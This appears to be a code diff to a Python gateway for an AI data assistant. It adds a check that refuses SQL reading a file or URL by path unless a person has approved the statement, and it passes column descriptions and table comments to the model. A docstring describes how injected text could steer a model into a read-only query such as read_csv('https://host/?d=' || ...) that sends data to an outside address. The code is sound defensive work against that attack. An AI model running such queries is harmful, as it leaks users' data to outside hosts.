@@ -25,6 +25,7 @@ import json
 import httpx
 
 from api.config import settings
+from api.services.statement_policy import path_reads
 
 # Query statuses that mean the run has stopped (mirrors the scheduler's terminal set).
 _TERMINAL = {"done", "failed", "cancelled"}
@@ -238,6 +239,25 @@ def _describe(exc: httpx.HTTPStatusError) -> GatewayError:
     return GatewayError(f"Request failed ({code}): {detail}", terminal=code >= 500)
 
 
+def refuse_path_reads(sql: str) -> None:
+    """Raise :class:`GatewayError` if ``sql`` reads a file or URL by path.
+
+    For a statement nobody has seen. Untrusted text can steer a model into
+    ``SELECT * FROM read_csv('https://host/?d=' || ...)``, which is read-only, so
+    nothing else would stop it, and the address is where the data goes.
+    """
+    if reads := path_reads(sql):
+        reader, path = reads[0]
+        raise GatewayError(
+            f"Reading a file or URL by path is not allowed here ({reader}"
+            f"{f' {path!r}' if path else ''}): an outside address in a query is a way for "
+            "data to leave. Query a table in a catalog instead, or tell the user to run "
+            "the statement themselves.",
+            kind="denied",
+            terminal=True,
+        )
+
+
 class Gateway:
     """Per-turn wrapper over the loopback ``httpx`` client, scoped to a workspace."""
 
@@ -359,15 +379,25 @@ class Gateway:
             f"/workspaces/{self._ws}/catalogs/{catalog}/schemas/{schema}/tables/{table}"
         )
         t = resp.json()
-        return {
+        described: dict = {
             "name": t.get("name"),
             "row_count": t.get("row_count"),
             "size_bytes": t.get("size_bytes"),
             "columns": [
-                {"name": c["name"], "type": c["type"], "nullable": c.get("nullable")}
+                {
+                    "name": c["name"],
+                    "type": c["type"],
+                    "nullable": c.get("nullable"),
+                    # Only where the table's author wrote one, so a column that has
+                    # nothing to say does not cost the model a key for it.
+                    **({"description": c["description"]} if c.get("description") else {}),
+                }
                 for c in t.get("columns", [])
             ],
         }
+        if comment := (t.get("properties") or {}).get("comment"):
+            described["comment"] = comment
+        return described
 
     async def table_lineage(
         self,
@@ -855,15 +885,20 @@ class Gateway:
         catalog: str | None,
         timeout_s: float,
         tags: dict[str, str] | None = None,
+        approved: bool = False,
     ) -> dict:
         """Submit a query, wait for it to finish, and return a capped result sample.
 
+        A statement that reads a file or URL by path is refused unless ``approved``:
+        a person has seen the exact statement (see :func:`refuse_path_reads`).
 
         Returns a dict with ``query_id``, ``status``, ``columns``, ``column_types``,
         capped ``rows``, ``total`` row count, and a ``truncated`` flag. ``tags`` are
         added to the gateway's own for this query. Raises :class:`GatewayError`
         with a model-friendly message on any governed rejection or failure.
         """
+        if not approved:
+            refuse_path_reads(sql)
         # No agent_id: the server runs it on the workspace's default compute, or
         # picks a connected agent when there is none, and starts a stopped default.
         # `scale_out: false` is the rule that the assistant never adds an agent to
